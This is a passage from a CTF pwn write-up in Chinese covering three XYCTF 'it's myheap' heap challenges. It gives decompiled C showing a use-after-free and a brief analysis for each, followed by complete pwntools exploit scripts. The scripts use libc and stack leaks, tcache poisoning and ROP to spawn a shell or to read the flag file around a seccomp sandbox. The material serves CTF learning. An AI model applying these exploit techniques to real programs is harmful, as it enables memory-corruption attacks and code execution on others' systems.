  while ( 1 )
  {
    while ( 1 )
    {
      menu();             //   puts("[1] add_chunk()");
                          //   puts("[2] delete_chunk()");
                          //   puts("[3] view_chunk()");
                          //   puts("[4] exit()");
                          //   return printf(">>> ");
      choice = get_choice();
      if ( choice != 1 )
        break;
      add_chunk();
    }
    switch ( choice )
    {
      case 2:
        delete_chunk();
        break;
      case 3:
        view_chunk();
        break;
      case 114514:
        _();
        break;
      default:
        puts("[-] exit()");
        exit(0);
    }
  }
}

void add_chunk()
{
  unsigned __int64 idx;   // [rsp+8h] [rbp-28h] BYREF
  size_t size;            // [rsp+10h] [rbp-20h] BYREF
  msg *ptr;               // [rsp+18h] [rbp-18h]
  void *buf;              // [rsp+20h] [rbp-10h]
  unsigned __int64 v4;    // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%lld", &idx);
  if ( idx < 0x10 )
  {
    printf("[?] Enter chunk size: ");
    scanf("%lld", &size);
    ptr = (msg *)malloc(0x18uLL);
    ptr->size = size;
    if ( ptr )
    {
      buf = malloc(size);
      ptr->con = buf;
      if ( buf )
      {
        printf("[?] Enter chunk data: ");
        read(0, buf, size);
        chunk_list[idx] = ptr;
        ptr->flag = 1LL;
      }
      else
      {
        puts("[-] Failed to create chunk for data!");
      }
    }
    else
    {
      puts("[-] Failed to create new chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
}

void delete_chunk()
{
  unsigned __int64 idx;   // [rsp+8h] [rbp-18h] BYREF
  msg *ptr;               // [rsp+10h] [rbp-10h]
  unsigned __int64 v2;    // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  scanf("%lld", &idx);
  if ( idx < 0x10 )
  {
    ptr = chunk_list[idx];
    if ( ptr )
    {
      if ( ptr->flag )
      {
        free(chunk_list[idx]);
        free(ptr->con);
        ptr->flag = 0LL;  // uaf
      }
      else
      {
        puts("[-] Chunk is not used!");
      }
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
}

void view_chunk()
{
  _QWORD idx[2];          // [rsp+0h] [rbp-10h] BYREF

  idx[1] = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  scanf("%lld", idx);
  if ( idx[0] < 0x10uLL )
  {
    if ( chunk_list[idx[0]] )
    {
      if ( chunk_list[idx[0]]->flag )
        write(1, chunk_list[idx[0]]->con, chunk_list[idx[0]]->size);
      else
        puts("[-] Chunk is not used!");
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
}

int _()
{
  printf("this is a gift: %p\n", &puts);
  return gift(hello_world);
}
```
### 分析
UAF，而且能直接泄 libc；覆盖 `hello_world` 和 `gift`。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./vuln')

io = process(elf.path)
# gdb.attach(io, 'b *0x401773')
# addr = 'xxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

def cmd(c: int):
    io.recvuntil(b'>>> ')
    io.sendline(str(c).encode())

def add(idx: int, size: int, content: bytes):
    cmd(1)
    io.recvuntil(b'[?] please input chunk_idx: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'[?] Enter chunk size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'[?] Enter chunk data: ')
    io.send(content)

def delete(idx: int):
    cmd(2)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

def show(idx: int):
    cmd(3)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

cmd(114514)
io.recvuntil(b'0x')
libc.address = int(io.recvn(12), 16) - libc.sym['puts']
info('libc_base:' + hex(libc.address))

add(0, 0x10, b'a'*0x10)
add(1, 0x20, b'b'*0x20)

delete(0)
add(0, 0x18, b'a'*0x10)
show(0)

io.recvuntil(b'a'*0x10)
heap_addr = u64(io.recvn(6).ljust(8, b'\x00')) - 0x2c0
info('heap_addr:' + hex(heap_addr))

add(2, 0x18, b'c'*0x10)
add(3, 0x30, p64(0)+p64(0xa1))
add(4, 0x20, b'e'*0x20)
add(5, 0x20, b'f'*0x20)

delete(2)
add(6, 0x18, p64(0x90)+p64(1)+p64(heap_addr+0x3a0))
delete(2)

delete(4)
delete(5)

extend = p64(0)*4
extend += p64(0) + p64(0x21)
extend += p64(0x404070^(heap_addr >> 12)) + p64(0)
add(7, 0x90, extend)

con = b'/bin/sh\x00'+p64(0) + p64(libc.symbols['system'])
add(8, 0x18, con)

cmd(114514)

io.interactive()
```

## 15. ptmalloc2 it's myheap pro
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;            // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();            //   puts("[1] add_chunk()");
                         //   puts("[2] delete_chunk()");
                         //   puts("[3] view_chunk()");
                         //   puts("[4] exit()");
                         //   return printf(">>> ");
      choice = get_choice();
      if ( choice != 1 )
        break;
      add_chunk();
    }
    if ( choice == 2 )
    {
      delete_chunk();
    }
    else
    {
      if ( choice != 3 )
      {
        puts("[-] exit()");
        exit(0);
      }
      view_chunk();
    }
  }
}

__int64 get_choice()
{
  unsigned int v1;       // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2;   // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  scanf("%u", &v1);
  return v1;
}

unsigned __int64 add_chunk()
{
  unsigned __int64 idx;  // [rsp+8h] [rbp-28h] BYREF
  __int64 size;          // [rsp+10h] [rbp-20h] BYREF
  msg *ptr;              // [rsp+18h] [rbp-18h]
  void *buf;             // [rsp+20h] [rbp-10h]
  unsigned __int64 v5;   // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%lld", &idx);
  if ( idx < 0x10 )
  {
    printf("[?] Enter chunk size: ");
    scanf("%lld", &size);
    if ( size <= 0x80 )
    {
      ptr = (msg *)malloc(0x18uLL);
      ptr->size = size;
      if ( ptr )
      {
        buf = malloc(size);
        ptr->con = buf;
        if ( buf )
        {
          printf("[?] Enter chunk data: ");
          read(0, buf, size);
          chunk_list[idx] = ptr;
          ptr->flag = 1LL;
        }
        else
        {
          puts("[-] Failed to create chunk for data!");
        }
      }
      else
      {
        puts("[-] Failed to create new chunk!");
      }
    }
    else
    {
      puts("[-] too big");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v5 - __readfsqword(0x28u);
}

unsigned __int64 delete_chunk()
{
  unsigned __int64 idx;  // [rsp+8h] [rbp-18h] BYREF
  msg *ptr;              // [rsp+10h] [rbp-10h]
  unsigned __int64 v3;   // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  scanf("%lld", &idx);
  if ( idx < 0x10 )
  {
    ptr = (msg *)chunk_list[idx];
    if ( ptr )
    {
      if ( ptr->flag )
      {
        free((void *)chunk_list[idx]);
        free(ptr->con);
        ptr->flag = 0LL;
      }
      else
      {
        puts("[-] Chunk is not used!");
      }
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 view_chunk()
{
  unsigned __int64 idx;  // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2;   // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  scanf("%lld", &idx);
  if ( idx < 0x10 )
  {
    if ( chunk_list[idx] )
    {
      if ( chunk_list[idx]->flag )
        write(1, chunk_list[idx]->con, chunk_list[idx]->size);
      else
        puts("[-] Chunk is not used!");
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v2 - __readfsqword(0x28u);
}
```
### 分析
UAF 依然在，用 House of rabbit 绕过 flag 检测；泄出 libc 后还能再泄栈。题目本意大概是打 `exit_hook`，我偷懒改打了 ROP。
### exp
```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
elf = ELF('./vuln')

io = process('./vuln')
# gdb.attach(io, 'b *0x4017B5')

# addr = 'xxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

def cmd(c: int):
    io.recvuntil(b'>>> ')
    io.sendline(str(c).encode())

def add(idx: int, size: int, content: bytes):
    cmd(1)
    io.recvuntil(b'[?] please input chunk_idx: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'[?] Enter chunk size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'[?] Enter chunk data: ')
    io.send(content)

def delete(idx: int):
    cmd(2)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

def show(idx: int):
    cmd(3)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

for i in range(7):
    add(i, 0x18, b'a')

for i in range(6):
    delete(i)

cmd(1)
io.recvuntil(b'[?] please input chunk_idx: ')
io.sendline(b'7'*0x1000)

add(0, 0x30, b'a'*0x20)
show(0)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0
log.info(f'libc base: {hex(libc.address)}')

add(1, 0x18, b'a'*0x10)
show(1)
io.recvuntil(b'a'*0x10)
heap = u64(io.recvn(4).ljust(8, b'\x00')) - 0x340
log.info(f'heap base: {hex(heap)}')

add(2, 0x18, b'a'*0x10)
delete(2)
add(3, 0x18, p64(0x28)+p64(1)+p64(libc.symbols['environ']))
show(2)
stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x138
info('stack leak: ' + hex(stack))

add(0, 0x50, b'a'*0x20)

add(4, 0x20, p64(0)+p64(0x81))
add(5, 0x30, b'a')
add(6, 0x30, b'a')
add(7, 0x30, b'a')

add(8, 0x18, b'a')
delete(8)
add(9, 0x18, p64(0x70)+p64(1)+p64(heap+0x470))
delete(8)

delete(6)
delete(5)

con = p64(0)*2
con += p64(0) + p64(0x21)
con += p64((heap+0x4f0)^(heap>>12)) + p64(0)
con += p64(0) + p64(0x41)
con += p64((stack-0x10)^(heap>>12)) + p64(0)

add(9,0x70, con)

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
rdi = libc.address + 0x2a3e5
ret = libc.address + 0x29139

add(10, 0x30, b'a')

log.info('plz check the heap')

add(1, 0x30, p64(rdi)*2+p64(binsh)+p64(ret)+p64(system))

io.interactive()
```

## 16. ptmalloc2 it's myheap plus
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice;           // [rsp+Ch] [rbp-4h]

  init();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu(argc, argv);
        choice = get_choice();
        if ( choice != 1 )
          break;
        add_chunk();
      }
      if ( choice != 2 )
        break;
      delete_chunk();
    }
    if ( choice != 3 )
      break;
    view_chunk();
  }
  puts("[-] break()");
  return 0;
}

__int64 init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  return sandbox();
}

__int64 sandbox()
{
  __int64 v1;           // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  return seccomp_load();
}

int menu()
{
  puts("Welcome to XYCTF");
  puts("[1] add_chunk()");
  puts("[2] delete_chunk()");
  puts("[3] view_chunk()");
  puts("[4] break()");
  return printf(">>> ");
}

unsigned __int64 add_chunk()
{
  unsigned __int64 v1;  // [rsp+8h] [rbp-28h] BYREF
  size_t size;          // [rsp+10h] [rbp-20h] BYREF
  _QWORD *v3;           // [rsp+18h] [rbp-18h]
  void *buf;            // [rsp+20h] [rbp-10h]
  unsigned __int64 v5;  // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  __isoc99_scanf("%lld", &v1);
  if ( v1 < 0x10 )
  {
    printf("[?] Enter chunk size: ");
    __isoc99_scanf("%lld", &size);
    if ( (__int64)size <= 0x80 )
    {
      v3 = malloc(0x18uLL);
      *v3 = size;
      if ( v3 )
      {
        buf = malloc(size);
        v3[2] = buf;
        if ( buf )
        {
          printf("[?] Enter chunk data: ");
          read(0, buf, size);
          chunk_list[v1] = v3;
          v3[1] = 1LL;
        }
        else
        {
          puts("[-] Failed to create chunk for data!");
        }
      }
      else
      {
        puts("[-] Failed to create new chunk!");
      }
    }
    else
    {
      puts("[-] too big");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v5 - __readfsqword(0x28u);
}

unsigned __int64 delete_chunk()
{
  unsigned __int64 v1;  // [rsp+8h] [rbp-18h] BYREF
  __int64 v2;           // [rsp+10h] [rbp-10h]
  unsigned __int64 v3;  // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  __isoc99_scanf("%lld", &v1);
  if ( v1 < 0x10 )
  {
    v2 = chunk_list[v1];
    if ( v2 )
    {
      if ( *(_QWORD *)(v2 + 8) )
      {
        free((void *)chunk_list[v1]);
        free(*(void **)(v2 + 16));
        *(_QWORD *)(v2 + 8) = 0LL;
      }
      else
      {
        puts("[-] Chunk is not used!");
      }
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 view_chunk()
{
  unsigned __int64 v1;  // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2;  // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] Enter chunk id: ");
  __isoc99_scanf("%lld", &v1);
  if ( v1 < 0x10 )
  {
    if ( chunk_list[v1] )
    {
      if ( *(_QWORD *)(chunk_list[v1] + 8LL) )
        write(1, *(const void **)(chunk_list[v1] + 16LL), *(_QWORD *)chunk_list[v1]);
      else
        puts("[-] Chunk is not used!");
    }
    else
    {
      puts("[-] No such chunk!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return v2 - __readfsqword(0x28u);
}
```
### 分析
和上一题类似，但开了沙箱不能直接 getshell：把栈迁到堆上，ROP 走 ORW。

### exp
```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
elf = ELF('./vuln')

io = process('./vuln')
# gdb.attach(io, 'b *$rebase(0x182D)')

# addr = 'xxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

def cmd(c: int):
    io.recvuntil(b'>>> ')
    io.sendline(str(c).encode())

def add(idx: int, size: int, content: bytes):
    cmd(1)
    io.recvuntil(b'[?] please input chunk_idx: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'[?] Enter chunk size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'[?] Enter chunk data: ')
    io.send(content)

def delete(idx: int):
    cmd(2)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

def show(idx: int):
    cmd(3)
    io.recvuntil(b'[?] Enter chunk id: ')
    io.sendline(str(idx).encode())

for i in range(7):
    add(i, 0x18, b'a')

for i in range(6):
    delete(i)

cmd(1)
io.recvuntil(b'[?] please input chunk_idx: ')
io.sendline(b'7'*0x1000)

add(0, 0x30, b'a'*0x20)
show(0)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0
log.info(f'libc base: {hex(libc.address)}')

add(1, 0x18, b'a'*0x10)
show(1)
io.recvuntil(b'a'*0x10)
heap = u64(io.recvn(8).ljust(8, b'\x00')) - 0xe40
log.info(f'heap base: {hex(heap)}')

add(2, 0x18, b'a'*0x10)
delete(2)
add(3, 0x18, p64(0x28)+p64(1)+p64(libc.symbols['environ']))
show(2)
stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x138
info('stack leak: ' + hex(stack))

# 清理 bins
add(0, 0x40, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x60, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'x'*0x10)
add(0, 0x70, b'./flag\x00')

rdi = libc.address + 0x2a3e5
rsi = libc.address + 0x2be51
rdx_r12 = libc.address + 0x11f2e7
rsp = libc.address + 0x35732

# orw 栈
con = p64(rdi) + p64(heap + 0x1610)
con += p64(rsi) + p64(0)
con += p64(rdx_r12) + p64(0)
con += p64(0) + p64(libc.symbols['open'])
con += p64(rsp) + p64(heap + 0x1750)
add(0, 0x70, con)

con = p64(rdi) + p64(3)
con += p64(rsi) + p64(heap + 0x10)
con += p64(rdx_r12) + p64(0x40)
con += p64(0) + p64(libc.symbols['read'])
con += p64(rsp) + p64(heap + 0x17f0)
add(1, 0x70, con)

con = p64(rdi) + p64(1)
con += p64(rsi) + p64(heap + 0x10)
con += p64(rdx_r12) + p64(0x40)
con += p64(0) + p64(libc.symbols['write'])
con += p64(rsp) + p64(0)
add(2, 0x70, con)

con = p64(0)+p64(0x71)
add(3, 0x20, con)

add(4, 0x20, b's')
add(5, 0x20, b'a')
add(6, 0x20, b'b')
add(7, 0x20, b'c')

delete(7)
delete(4)
delete(5)
delete(6)

add(8, 0x18, p64(0x60)+p64(1)+p64(heap+0x18a0))
delete(5)

con = p64(0)*2
con += p64(0) + p64(0x21)
con += p64(((heap >> 12)+1) ^ (stack - 0x10))

add(8, 0x60, con)

add(10, 0x18, p64(rsp)*2+p64(heap + 0x16b0))

io.interactive()
```
